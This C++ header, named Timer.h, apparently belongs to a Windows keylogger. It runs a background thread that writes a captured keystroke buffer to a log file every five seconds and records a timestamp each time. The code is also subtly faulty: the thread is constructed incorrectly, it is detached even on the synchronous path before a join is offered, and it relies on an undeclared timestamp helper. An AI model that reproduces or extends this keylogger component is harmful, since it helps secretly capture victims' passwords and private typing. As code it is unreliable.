#ifndef TIMER_H
#define TIMER_H
#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <functional>
#include "windows.h"
#include "FileOperations.h"
#include "Keyboard.h"

namespace tim
{
    class tim
    {
        public:

        std::thread Thread;

        void threadFunc(void)
        {
            while(1){
                fileOperations::fileOps().WriteLog(keylog);
                fileOperations::fileOps().WriteAppLog("File logged @ " + timestamp::timestamp().getDateAndTime());
                std::this_thread::sleep_for(std::chrono::seconds(5));
            }
        }
        
        void start(bool Async = true)
        {
            if(Async)
                Thread = std::thread(threadFunc, this);
            else
                this->threadFunc();

            Thread.detach();
        }

        void stop(void)
        {
            Thread.join();
        }

    };
}

#endif //TIMER_H